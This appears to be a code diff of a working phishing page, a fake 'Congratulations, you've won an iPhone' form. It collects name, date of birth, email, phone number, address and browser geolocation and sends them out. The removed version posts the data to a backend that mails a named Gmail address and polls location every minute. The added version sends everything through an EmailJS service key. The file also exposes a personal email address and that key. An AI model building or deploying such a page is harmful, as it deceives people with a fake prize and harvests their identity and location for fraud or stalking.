@@ -1,205 +1,146 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iPhone Reward Form</title>
-    <!-- Bootstrap CSS -->
-    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-image: url('https://via.placeholder.com/1920x1080'); /* Replace with the desired background URL */
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-        }
-        .container {
-            max-width: 600px;
-            background: rgba(255, 255, 255, 0.85); /* Semi-transparent white background */
-            padding: 2rem;
-            border-radius: 8px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
-            text-align: center;
-        }
-        .form-heading {
-            color: #333;
-            font-size: 1.5rem;
-            margin-bottom: 20px;
-        }
-        .btn-primary {
-            background-color: #007bff;
-            border: none;
-            margin-top: 15px;
-        }
-        .btn-primary:hover {
-            background-color: #0056b3;
-        }
-        .form-text {
-            font-size: 0.9rem;
-            color: #666;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>iPhone Reward Form</title>
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-image: url('https://via.placeholder.com/1920x1080');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+    .container {
+      max-width: 600px;
+      background: rgba(255, 255, 255, 0.85);
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+    .form-heading {
+      color: #333;
+      font-size: 1.5rem;
+      margin-bottom: 20px;
+    }
+    .btn-primary {
+      background-color: #007bff;
+      border: none;
+      margin-top: 15px;
+    }
+    .btn-primary:hover {
+      background-color: #0056b3;
+    }
+    .form-text {
+      font-size: 0.9rem;
+      color: #666;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1 class="form-heading">Congratulations! 🎉</h1>
-        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-        <p class="form-text">Please fill out the form below to claim your reward.</p>
+  <div class="container">
+    <h1 class="form-heading">Congratulations! 🎉</h1>
+    <p class="lead">You've been selected to receive a brand-new iPhone!</p>
+    <p class="form-text">Please fill out the form below to claim your reward.</p>
 
-        <!-- Fill Out Form -->
-        <form id="rewardForm">
-            <div class="form-group">
-                <label for="fullName">Full Name</label>
-                <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required>
-            </div>
-            <div class="form-group">
-                <label for="dob">Date of Birth</label>
-                <input type="date" class="form-control" id="dob" required>
-            </div>
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" class="form-control" id="email" placeholder="Enter your email" required>
-            </div>
-            <div class="form-group">
-                <label for="phoneNumber">Phone Number</label>
-                <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required>
-            </div>
-            <div class="form-group">
-                <label for="address">Shipping Address</label>
-                <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
-            </div>
-            <div class="form-group">
-                <label for="city">City</label>
-                <input type="text" class="form-control" id="city" placeholder="Enter your city" required>
-            </div>
-            <div class="form-group">
-                <label for="postalCode">Postal Code</label>
-                <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
-            </div>
+    <form id="rewardForm">
+      <div class="form-group">
+        <label for="fullName">Full Name</label>
+        <input type="text" class="form-control" id="fullName" required />
+      </div>
+      <div class="form-group">
+        <label for="dob">Date of Birth</label>
+        <input type="date" class="form-control" id="dob" required />
+      </div>
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" class="form-control" id="email" required />
+      </div>
+      <div class="form-group">
+        <label for="phoneNumber">Phone Number</label>
+        <input type="tel" class="form-control" id="phoneNumber" required />
+      </div>
+      <div class="form-group">
+        <label for="address">Shipping Address</label>
+        <textarea class="form-control" id="address" rows="3" required></textarea>
+      </div>
+      <div class="form-group">
+        <label for="city">City</label>
+        <input type="text" class="form-control" id="city" required />
+      </div>
+      <div class="form-group">
+        <label for="postalCode">Postal Code</label>
+        <input type="text" class="form-control" id="postalCode" required />
+      </div>
 
-            <p id="locationDisplay" class="form-text" style="background: rgba(255, 255, 255, 0.85); color: #666; padding: 0.5rem; border-radius: 4px;">Location permissions required to auto-fill your location.</p>
-            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
-        </form>
-    </div>
+      <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
+      <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
+    </form>
+  </div>
 
-    <!-- Bootstrap and jQuery JS -->
-    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("_fZgZZhnhhK2OvuV"); // Public Key
+    })();
+  </script>
 
-    <!-- JavaScript for Geolocation and Email Sending -->
-    <script>
-        let locationInterval;  // Variable to store the interval ID for periodic location requests
+  <script>
+    let userLocation = "Not Available";
 
-        document.addEventListener("DOMContentLoaded", function () {
-            const locationDisplay = document.getElementById("locationDisplay");
+    // Get Geolocation on load
+    document.addEventListener("DOMContentLoaded", function () {
+      const locationDisplay = document.getElementById("locationDisplay");
 
-            // Function to request the user's location
-            function requestLocation() {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-                            locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                            
-                            // Send location data via email
-                            sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
-                        },
-                        (error) => {
-                            switch (error.code) {
-                                case error.PERMISSION_DENIED:
-                                    locationDisplay.textContent = "Location access denied by user.";
-                                    break;
-                                case error.POSITION_UNAVAILABLE:
-                                    locationDisplay.textContent = "Location information is unavailable.";
-                                    break;
-                                case error.TIMEOUT:
-                                    locationDisplay.textContent = "Location request timed out.";
-                                    break;
-                                default:
-                                    locationDisplay.textContent = "An unknown error occurred.";
-                                    break;
-                            }
-                            // Send error message via email if location can't be accessed
-                            sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
-                        }
-                    );
-                } else {
-                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
-                }
-            }
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            userLocation = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+            locationDisplay.textContent = userLocation;
+          },
+          function (error) {
+            userLocation = "Unable to access location: " + error.message;
+            locationDisplay.textContent = userLocation;
+          }
+        );
+      } else {
+        userLocation = "Geolocation not supported";
+        locationDisplay.textContent = userLocation;
+      }
 
-            // Periodically request location every minute (60,000 ms)
-            locationInterval = setInterval(requestLocation, 60000);
+      // Form submission
+      document.getElementById("rewardForm").addEventListener("submit", function (e) {
+        e.preventDefault();
 
-            // Request location on page load (for the initial location)
-            requestLocation();
+        const templateParams = {
+          full_name: document.getElementById("fullName").value,
+          dob: document.getElementById("dob").value,
+          email: document.getElementById("email").value,
+          phone: document.getElementById("phoneNumber").value,
+          address: document.getElementById("address").value,
+          city: document.getElementById("city").value,
+          postal_code: document.getElementById("postalCode").value,
+          location: userLocation
+        };
 
-            // Request location on form submission
-            document.getElementById("rewardForm").addEventListener("submit", function (e) {
-                e.preventDefault();
-
-                // Collect form data
-                const fullName = document.getElementById("fullName").value;
-                const dob = document.getElementById("dob").value;
-                const email = document.getElementById("email").value;
-                const phoneNumber = document.getElementById("phoneNumber").value;
-                const address = document.getElementById("address").value;
-                const city = document.getElementById("city").value;
-                const postalCode = document.getElementById("postalCode").value;
-
-                // Format form data into a message
-                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}`;
-
-                // Send form data via email
-                sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodeni@gmail.com");
-
-                // Display success message
-                alert("Thank you for your submission! We will contact you shortly.");
-            });
-        });
-
-        // Send Email Function
-        function sendEmail(subject, message, recipientEmail) {
-            const emailData = {
-                subject: subject,
-                message: message,
-                recipient_email: recipientEmail,
-                recipient_name: "Khalil Ahmed"
-            };
-
-            fetch("https://zalex-backend.onrender.com/api/send-email/", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(emailData)
-            })
-            .then(response => {
-                if (response.ok) {
-                    return response.json();
-                } else {
-                    throw new Error(`Server responded with ${response.status}`);
-                }
-            })
-            .then(data => {
-                if (data.message) {
-                    console.log("Email sent successfully");
-                } else if (data.error) {
-                    alert("Error: " + data.error);
-                }
-            })
-            .catch(error => {
-                console.log("Error sending email:", error);
-                alert("Error sending email: " + error.message);
-            });
-        }
-    </script>
+        emailjs.send("service_7xiz4x8", "template_xxxxxx", templateParams)
+          .then(function(response) {
+            alert("Form submitted successfully! 🎉");
+            console.log("SUCCESS!", response.status, response.text);
+          }, function(error) {
+            alert("Failed to send email: " + error.text);
+            console.log("FAILED...", error);
+          });
+      });
+    });
+  </script>
 </body>
 </html>
